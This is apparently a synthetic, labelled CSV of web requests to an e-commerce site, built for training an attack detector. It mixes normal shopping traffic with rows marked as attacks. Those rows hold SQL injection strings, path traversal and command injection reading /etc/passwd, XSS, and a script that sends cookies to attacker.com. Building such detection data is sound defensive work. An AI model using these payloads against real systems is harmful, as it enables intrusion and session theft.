timestamp,ip,method,path,payload,label
07:37:17.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:37:18.8,10.0.0.28,GET,/product/1,,0
07:37:21.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:37:22.8,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:37:25.4,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Im96UoIN9tQVodEw53d4kvMH0hnCBvP7el8BpWl0Ax'.ClnW8VOG.6cZFdzBfgIxGrR_NE8iaeZcx6_6e, 'username': 'newuser50', 'email': 'a54@b.com', 'password': 'G)AIlBi@q^oP', 'submit': 'Register'}",0
07:37:27.3,103.75.118.228,GET,/product/1' AND 1=1,,1
07:37:29.2,192.168.1.22,POST,/auth/register,"{'csrf_token': 'Im81IBRS0Fwjgn6IcS9PEDH93BFAYSm00yhia5Tg2h'.Mkij0BLC.SvkjAMF3XbaSORKKMF2z1Nk16Tzs, 'username': 'newuser78', 'email': 'a88@b.com', 'password': '14E4TkrzknS1', 'submit': 'Register'}",0
07:37:31.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:37:33.7,10.0.0.195,GET,/auth/logout,,0
07:37:35.6,192.168.1.55,POST,/search,{'query': 'iphone 15 pro max'},0
07:37:37.7,192.168.1.182,GET,/order/myorders,,0
07:37:39.3,203.162.4.191,GET,/auth/register,,0
07:37:40.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:37:42.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:37:44.8,192.168.1.28,GET,/auth/login,,0
07:37:47.6,203.162.4.190,GET,/order/myorders,,0
07:37:49.2,192.168.1.175,GET,/,,0
07:37:51.4,10.0.0.67,GET,/auth/register,,0
07:37:53.0,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImcxiCbZb3sRw9SalTLiFukCpJVBV9cUSIW0Vu8NHR'.h5kK5VmI.qCRaTdIdCegq8VklfVvJPnN61Myp, 'username': 'newuser81', 'email': 'a81@b.com', 'password': 'HuS@*LwRLOTw', 'submit': 'Register'}",0
07:37:55.0,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:37:56.8,192.168.1.165,GET,/,,0
07:37:59.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:38:01.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:38:03.3,203.162.4.190,GET,/../../../../etc/passwd,,1
07:38:05.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:38:07.2,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImTVkCDrmitaB0yXbS21wSviZwcokkZscfMZI90GiM'.bfPPGleK.MdkqpGJdxyY_dg68JhA4LnsjEUxT, 'username': 'user12', 'password': 'gPxHRc#jNcJ4', 'submit': 'Log in'}",0
07:38:09.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:38:11.0,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:38:13.5,10.0.0.67,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:38:14.9,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:38:17.0,192.168.1.104,POST,/auth/register,"{'csrf_token': 'Im9hA4OroHCeuXpH39u0z4pJ2aI5pIIIr096wRuja7'.R0I3EIwx.8HQtLpCa3YsbkaeMw147F8FC8CXt, 'username': 'newuser28', 'email': 'a94@b.com', 'password': '92h2U@5DdETl', 'submit': 'Register'}",0
07:38:19.2,203.162.4.190,GET,/../../../../etc/passwd,,1
07:38:21.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:38:22.8,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
07:38:25.3,203.162.4.190,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:38:26.9,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImBySLJSkoyzL4io4z9Bkt05Rv8cPjIiSnQH8QUrnC'.fHfCf8Ta.IKLHlShGnuy9qK-m8Iw0-6PrjTSL, 'username': 'user61', 'password': '5Kp)k)FDio09', 'submit': 'Log in'}",0
07:38:29.1,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
07:38:30.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:38:33.3,192.168.1.197,GET,/,,0
07:38:34.9,192.168.1.141,GET,/product/1,,0
07:38:37.4,192.168.1.167,GET,/order/myorders,,0
07:38:38.8,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:38:41.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:38:43.3,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:38:45.7,203.162.4.191,GET,/../../../../etc/passwd,,1
07:38:46.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:38:49.1,10.0.0.176,POST,/search,{'query': 'iphone 15 pro max'},0
07:38:51.1,203.162.4.190,POST,/auth/register,"{'csrf_token': 'ImTbVBf3SR3pRQqjVd1oVVhPhlpd2BOIkNy30Om4Uf'.pP5fuixC.2lES5anCVvxbNtAqBMpuIcy_ojjR, 'username': 'newuser32', 'email': 'a42@b.com', 'password': '#i7gNVTdwIhg', 'submit': 'Register'}",0
07:38:53.2,127.0.0.1,GET,/,,0
07:38:55.3,192.168.1.197,GET,/auth/login,,0
07:38:57.2,192.168.1.165,GET,/auth/register,,0
07:38:59.7,192.168.1.46,POST,/search,{'query': 'iphone 15 pro max'},0
07:39:01.0,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImY9mRsb6g8Gz625MI9eVmxruF0JhyCQn87uNnlBJ1'.IlzrfHiM.oHzwfVYP1rE91PDcYg8SnX4m4q9Z, 'username': 'newuser58', 'email': 'a65@b.com', 'password': 'LLs7CI^wmF0)', 'submit': 'Register'}",0
07:39:03.0,127.0.0.1,POST,/auth/register,"{'csrf_token': 'ImsUVQzyfQhBqi8zdfoSlu0dNqoOtKFgsZbIZhBpYZ'.I263Qw3C.0na9b4IgpP8xRc0QEih5RHb1154M, 'username': 'newuser13', 'email': 'a46@b.com', 'password': 'zDorVxtIsFv1', 'submit': 'Register'}",0
07:39:05.1,192.168.1.144,POST,/auth/register,"{'csrf_token': 'ImOVa1414bzq9pcZqsEour38iDzEGdhti2V5brsERM'.as55VgOR.ruM8fLRsbv4QBN6zuJnV3bks7EUV, 'username': 'newuser89', 'email': 'a39@b.com', 'password': 'BD29G%MjmzPf', 'submit': 'Register'}",0
07:39:06.9,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:39:09.0,192.168.1.22,GET,/auth/logout,,0
07:39:11.3,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:39:12.9,203.162.4.190,GET,/../../../../etc/passwd,,1
07:39:15.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:39:17.5,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImcZEQhvxIw27jkLESSt5SaEUcw7RZRhJNPOhplgkA'.IXr3A964.J4tFMvIegHz_0cvWkfQFvZpxmiH7, 'username': 'newuser74', 'email': 'a34@b.com', 'password': 'Dxz2t82OD4q$', 'submit': 'Register'}",0
07:39:19.2,192.168.1.18,GET,/product/1,,0
07:39:21.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:39:22.8,192.168.1.50,GET,/order/myorders,,0
07:39:25.6,192.168.1.197,GET,/order/myorders,,0
07:39:27.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:39:29.6,10.0.0.67,GET,/auth/register,,0
07:39:31.0,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:39:33.7,10.0.0.79,GET,/order/cart,,0
07:39:35.5,10.0.0.28,GET,/product/1,,0
07:39:37.4,192.168.1.165,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:39:39.0,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:39:40.9,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:39:43.5,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:39:45.6,10.0.0.66,POST,/auth/login,"{'csrf_token': 'Im88eUAnP8dYqgMFK13cR5jTmNVR9BHpziVq9R5lra'.qdMDe8yh.ZSE0igyha09xoBKWm2cdfBhljf6z, 'username': 'user36', 'password': 'mT&z8Mu@VVx2', 'submit': 'Log in'}",0
07:39:47.5,192.168.1.18,GET,/,,0
07:39:49.0,127.0.0.1,GET,/order/myorders,,0
07:39:51.4,203.162.4.190,GET,/product/1' AND 1=1,,1
07:39:53.3,192.168.1.185,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:39:55.1,192.168.1.162,GET,/order/myorders,,0
07:39:57.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:39:59.6,192.168.1.169,GET,/auth/register,,0
07:40:01.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:40:03.6,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:40:05.7,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:40:07.4,192.168.1.22,GET,/product/2,,0
07:40:09.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:40:11.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:40:13.5,10.0.0.106,GET,/auth/register,,0
07:40:15.2,192.168.1.197,GET,/product/2,,0
07:40:17.2,192.168.1.167,POST,/auth/register,"{'csrf_token': 'ImvTusjlDBBJtl9QpBS9T535TyGJyoe2ltW9oqcCw4'.zQt3zSpT.4ZpxrL62XZy2q2E-qMf4IdzOR_TB, 'username': 'newuser72', 'email': 'a82@b.com', 'password': 'VofyN7tl5V8M', 'submit': 'Register'}",0
07:40:19.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:40:21.7,10.0.0.176,GET,/auth/login,,0
07:40:23.1,192.168.1.167,GET,/category/Iphone,,0
07:40:25.4,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImDlMH7gs8GzRp0QhVy5Q9Ue3lBmhAJ5W0nJbJP3np'.ggmJHRBA.pYmgPV0ds_GZvIdPvCWBaUXkTwkr, 'username': 'newuser73', 'email': 'a77@b.com', 'password': 'LRk3RNR3Rz1q', 'submit': 'Register'}",0
07:40:27.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:40:29.5,192.168.1.12,GET,/order/cart,,0
07:40:31.5,192.168.1.12,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:40:33.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:40:34.8,203.162.4.190,GET,/product/1' AND 1=1,,1
07:40:37.1,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:40:38.9,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImEtNTZ872amepFGr6enmMSAhS1Fh8k7nGBTRupE0F'.6iAbBopq.nlMb_NXRWvn9PP6DAuSjbf3bVwPO, 'username': 'user42', 'password': 'SM@QOoQZ%DMD', 'submit': 'Log in'}",0
07:40:41.0,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:40:43.5,203.162.4.191,GET,/product/1' AND 1=1,,1
07:40:45.1,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:40:47.4,192.168.1.197,GET,/auth/register,,0
07:40:49.2,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:40:51.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:40:52.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:40:55.5,203.162.4.190,POST,/search,{'query': 'iphone 15 pro max'},0
07:40:57.2,10.0.0.82,POST,/auth/register,"{'csrf_token': 'Imb3e7Dpw4YHBN3DDiP6Wzis5JCR1bQcGflxVDP2pe'.m0Qqkxpp.HY4qqHofayc_u-kiAWYtrow3qUHZ, 'username': 'newuser37', 'email': 'a46@b.com', 'password': 'c1gG)xjRY76P', 'submit': 'Register'}",0
07:40:58.8,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:41:00.8,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:41:02.9,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:41:05.2,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
07:41:06.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:41:09.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:41:11.3,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImpyW27j7B7VPEvpCQCw456AW5V6m9ZMKUGecz8wFG'.TaZJBtNN.vCNAfEEex9ucT_EtPbitCbSx5aZn, 'username': 'user5', 'password': 'j@CLyV(sfMUC', 'submit': 'Log in'}",0
07:41:13.5,10.0.0.28,POST,/auth/register,"{'csrf_token': 'Imz122fATvY8AR7QPUsbs8JLdDJNuWaFczG0hb7BZq'.4gICuba1.daUYFy1k8z3ycBjHqLv6g_BvYG5x, 'username': 'newuser29', 'email': 'a25@b.com', 'password': 'J9&dOgCT1C1)', 'submit': 'Register'}",0
07:41:15.7,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:41:17.2,192.168.1.104,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:41:19.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:41:21.1,10.0.0.195,GET,/product/2,,0
07:41:23.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:41:25.6,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:41:27.2,192.168.1.104,POST,/auth/login,"{'csrf_token': 'ImRTDlhx83qDcK0LHJhi7qerdxOl321hKNmV9zz2ny'.ffRkf49I.qER3r6w67M2R8eSThEW62db-fp6U, 'username': 'user24', 'password': 'fBLOqLC^dui#', 'submit': 'Log in'}",0
07:41:28.8,103.75.118.228,GET,/product/1' AND 1=1,,1
07:41:31.4,203.162.4.191,GET,/../../../../etc/passwd,,1
07:41:33.2,192.168.1.12,POST,/auth/register,"{'csrf_token': 'ImWYjEimQ2FOAt00mHllSUL5ZxcFj7r6N28s9ZLoYS'.ciweRSl7.UKDJHcUAuM4Y6yauEpJk4dzywFww, 'username': 'newuser32', 'email': 'a96@b.com', 'password': '%lCktmeAA$v2', 'submit': 'Register'}",0
07:41:35.6,192.168.1.175,GET,/product/1,,0
07:41:37.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:41:38.9,10.0.0.106,GET,/product/1,,0
07:41:40.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:41:43.3,192.168.1.50,GET,/order/myorders,,0
07:41:44.8,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
07:41:47.6,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImCMYuqjwicARKjywu8n6jqz7Rr3TyPjJ5l7KMOOC8'.9CP0iz2g.yUjNSk0k1qOlJX3CI_6VaJsfV_A4, 'username': 'newuser95', 'email': 'a4@b.com', 'password': 'A*XJ6WeoGDvM', 'submit': 'Register'}",0
07:41:48.9,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
07:41:51.4,192.168.1.50,GET,/,,0
07:41:53.6,10.0.0.146,GET,/auth/register,,0
07:41:54.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:41:57.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:41:59.0,192.168.1.182,POST,/auth/register,"{'csrf_token': 'ImMxLmNiwJQHwUR1Hps7UT4QrXKG55ulpfsJokURbw'.s7FNOfAT.0E6-rJzIoUo7JmTPuCrQ7fbf_cMm, 'username': 'newuser97', 'email': 'a32@b.com', 'password': 'VT%)yIigmBSa', 'submit': 'Register'}",0
07:42:01.4,203.162.4.191,GET,/product/1,,0
07:42:03.0,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImGJwamgTS6UcapqKdel3fkV4613LLhBtiXRoydnv3'.cPIWGGDr.D9l8GwjokZBKwkvhs5ArLp2tGytI, 'username': 'user88', 'password': 'PAhH0pEJp8wS', 'submit': 'Log in'}",0
07:42:05.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:42:07.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:42:09.4,10.0.0.195,POST,/auth/register,"{'csrf_token': 'ImbOZamW0gXKr7DIjeMCKt7GqSyt96ohxUvL3uDow4'.7BdcTe2I.1LAWpf7jC-8L9SxFSUC591tGnWjm, 'username': 'newuser71', 'email': 'a94@b.com', 'password': 'UbQSXfhwDtpe', 'submit': 'Register'}",0
07:42:11.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:42:13.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:42:14.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:42:17.4,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:42:19.7,203.162.4.191,GET,/category/Iphone,,0
07:42:21.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:42:23.1,192.168.1.56,GET,/auth/register,,0
07:42:25.7,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
07:42:26.8,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImKGGYy07lWhvlHmzSZUY54DAcMR3Yk5IS1xJf7Ecm'.cYndQYkV.3hWX_87Si5blenLpnD6kp0VdsW_B, 'username': 'newuser3', 'email': 'a6@b.com', 'password': 'TqjeLqltFmW^', 'submit': 'Register'}",0
07:42:29.6,192.168.1.165,POST,/auth/login,"{'csrf_token': 'Imy4HGSnIJMEJWTkGUFP47Gw8BPIXnQkT4U1Ta2RhN'.Qis6K5wB.zsvfv0hEouYU8yjQobPkwGs2d-Ls, 'username': 'user65', 'password': '4i)Jx53#a)y@', 'submit': 'Log in'}",0
07:42:31.0,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
07:42:33.0,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
07:42:35.3,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImWNzI4Y78ed8wTFOqhNBhcYY5sBnKoR042QsL6zOc'.vvcxvQrH.R2Ikf7asZyF5rEf1pdhNglODXCW2, 'username': 'user75', 'password': 'QWd9(T3$x$za', 'submit': 'Log in'}",0
07:42:37.5,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:42:39.4,10.0.0.79,POST,/auth/login,"{'csrf_token': 'ImiHqGXiqipfNCDC87GJcCNsLyPyFnh55UP6FMZLTG'.UqjGFunA.z3isuifnXS0V7HrfbjOCp7yHs4ks, 'username': 'user25', 'password': 'Vy6D^8Pg6Fun', 'submit': 'Log in'}",0
07:42:40.9,192.168.1.175,POST,/auth/login,"{'csrf_token': 'ImTHSGIjZAntCMYLV4BE4T5foYIeoqHCssoVaHlCKo'.NCLvjydW.sIjx_mPnfoqSZmFnujpSnWxSeCga, 'username': 'user54', 'password': 'GotwO@Po!)v2', 'submit': 'Log in'}",0
07:42:43.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:42:45.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:42:47.3,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
07:42:49.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
